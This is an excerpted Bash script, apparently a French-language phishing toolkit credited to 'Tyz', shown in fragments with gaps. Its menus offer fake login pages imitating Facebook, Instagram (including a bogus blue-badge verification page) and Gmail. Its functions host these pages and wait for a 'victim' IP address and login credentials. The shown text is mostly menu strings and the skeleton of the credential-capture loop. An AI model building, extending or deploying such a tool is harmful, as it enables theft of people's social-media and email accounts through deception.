...
exit_on_signal_SIGINT() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Programme Interrompue." 2>&1; reset_color; }
    exit 0
}

exit_on_signal_SIGTERM() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Programme Terminé." 2>&1; reset_color; }
    exit 0
}
...
${RED}Version : 1.0
		...
		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tools Created By Tyz ${WHITE}
	EOF
}
...
msg_exit() {
	{ clear; banner; echo; }
	echo -e "${GREENBG}${BLACK} Merci d'utiliser ce tools.${RESETBG}\n"
	{ reset_color; exit 0; }
}
...
about() {
	{ clear; banner; echo; }
	cat <<- EOF
		${GREEN}Create By${RED} : ${ORANGE}Tyz
${GREEN}Github${RED} : ${ORANGE}https://github.com/TyzButSad

		${RED}[${WHITE}00${RED}]${ORANGE} Retourné Au Menu    ${RED}[${WHITE}99${RED}]${ORANGE} Quitter

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Choisi : ${BLUE}"

	if [[ "$REPLY" == 99 ]]; then
		msg_exit
	elif [[ "$REPLY" == 0 || "$REPLY" == 00 ]]; then
		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Retour au menu..."
		{ sleep 1; main_menu; }
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalide Option, Ressaye"
		{ sleep 1; about; }
	fi
}
...
capture_creds() {
	...
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} En attente des informations de connexion..."
}
...
capture_data() {
	...
	while true; do
		if [[ -e ".server/www/ip.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victime IP trouvé  !"
			capture_ip
...
start_localhost() {
	...
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Hébergé avec succès à  : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
	capture_data
}
...
tunnel_menu() {
	...
	cat <<- EOF
		...
		${RED}[${WHITE}01${RED}]${ORANGE} Localhost ${RED}[${CYAN}Développeur${RED}]
...
site_facebook() {
	cat <<- EOF
		...
		${RED}[${WHITE}02${RED}]${ORANGE} Page de connexion au sondage de vote avancé 
...
site_instagram() {
	cat <<- EOF
		...
		${RED}[${WHITE}01${RED}]${ORANGE} Page de connexion traditionnelle 
		${RED}[${WHITE}02${RED}]${ORANGE} Page de connexion des abonnés automatiques 
		${RED}[${WHITE}03${RED}]${ORANGE} Page de connexion de 1000 abonnés 
		${RED}[${WHITE}04${RED}]${ORANGE} Page de connexion de vérification du badge bleu 
...
site_gmail() {
	cat <<- EOF
		...
		${RED}[${WHITE}01${RED}]${ORANGE} Ancienne page de connexion à Gmail 
		${RED}[${WHITE}02${RED}]${ORANGE} Nouvelle page de connexion Gmail 
		${RED}[${WHITE}03${RED}]${ORANGE} Sondage de vote avancé 
...
main_menu() {
	...
	cat <<- EOF
		...
		${RED}[${WHITE}99${RED}]${ORANGE} A Propos         ${RED}[${WHITE}00${RED}]${ORANGE} Quitter
